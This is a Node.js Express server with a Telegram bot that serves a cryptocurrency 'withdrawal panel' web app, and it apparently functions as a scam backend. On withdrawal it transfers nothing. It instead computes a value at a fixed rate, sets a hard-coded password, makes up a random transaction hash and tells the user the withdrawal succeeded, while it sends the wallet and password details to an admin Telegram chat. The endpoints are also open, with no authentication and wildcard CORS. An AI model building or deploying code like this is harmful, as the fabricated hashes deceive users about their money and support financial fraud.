import express from "express";
import bodyParser from "body-parser";
import cors from "cors";
import { Telegraf } from "telegraf";
import crypto from "crypto";

const app = express();
app.use(cors());
app.use(bodyParser.json());

// =========================
// ENV
// =========================
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const WEBHOOK_URL = process.env.WEBHOOK_URL;

if (!BOT_TOKEN || !ADMIN_CHAT_ID || !WEBHOOK_URL)
  console.log("❌ Missing environment variables");

const bot = new Telegraf(BOT_TOKEN);

// =========================
// In-Memory Data (can replace with DB later)
// =========================
let userData = {
  wallet: null,
  password: null,
};

// =========================
// Telegram Webhook
// =========================
bot.telegram.setWebhook(`${WEBHOOK_URL}/webhook`);
app.use(bot.webhookCallback("/webhook"));

// Basic Commands
bot.start((ctx) => ctx.reply("Welcome! Withdrawal panel is ready."));
bot.help((ctx) => ctx.reply("Send /withdraw to open withdrawal panel."));
bot.command("withdraw", (ctx) => {
  ctx.reply("Click below to open withdrawal panel:", {
    reply_markup: {
      inline_keyboard: [
        [{ text: "Open Withdrawal Page", web_app: { url: WEBHOOK_URL } }],
      ],
    },
  });
});

// =========================
// API — Get Wallet Status
// =========================
app.get("/api/wallet", (req, res) => {
  res.json({
    wallet: userData.wallet,
  });
});

// =========================
// API — Bind / Update Wallet
// =========================
app.post("/api/wallet", (req, res) => {
  const { wallet, oldWallet } = req.body;

  if (!wallet) return res.json({ success: false, error: "Wallet required" });

  // Bind once — unless modifying
  if (!oldWallet && userData.wallet)
    return res.json({
      success: false,
      error: "Wallet already bound",
    });

  userData.wallet = wallet;

  res.json({
    success: true,
    wallet: userData.wallet,
  });
});

// =========================
// API — Submit Withdrawal
// =========================
app.post("/api/withdraw", async (req, res) => {
  const { coin, amount, wallet } = req.body;

  if (!wallet) return res.json({ success: false, error: "Wallet required" });
  if (!amount || amount <= 0)
    return res.json({ success: false, error: "Invalid amount" });

  const usdtValue = (amount * 50 - 0.1).toFixed(4);
  const password = userData.password || "44721";
  userData.password = password;

  const txHash =
    "TX-" + crypto.randomBytes(6).toString("hex") + "-" + Date.now().toString().slice(-6);

  // Telegram Notify
  const msg = `
📤 NEW WITHDRAWAL REQUEST
--------------------------------
💰 Coin: ${coin}
🔢 Amount: ${amount}
💵 USDT: ${usdtValue}
🏦 Wallet: ${wallet}
🔐 Password: ${password}
🆔 Transaction Hash: ${txHash}

⚠️ Wallet & password can be bound once.
Please screenshot the transaction hash for record.
`;

  await bot.telegram.sendMessage(ADMIN_CHAT_ID, msg);

  res.json({
    success: true,
    hash: txHash,
  });
});

// =========================
// Server Start
// =========================
app.get("/", (req, res) => {
  res.sendFile("/app/public/index.html");
});

app.listen(3000, () => {
  console.log("🚀 Server running on port 3000");
});
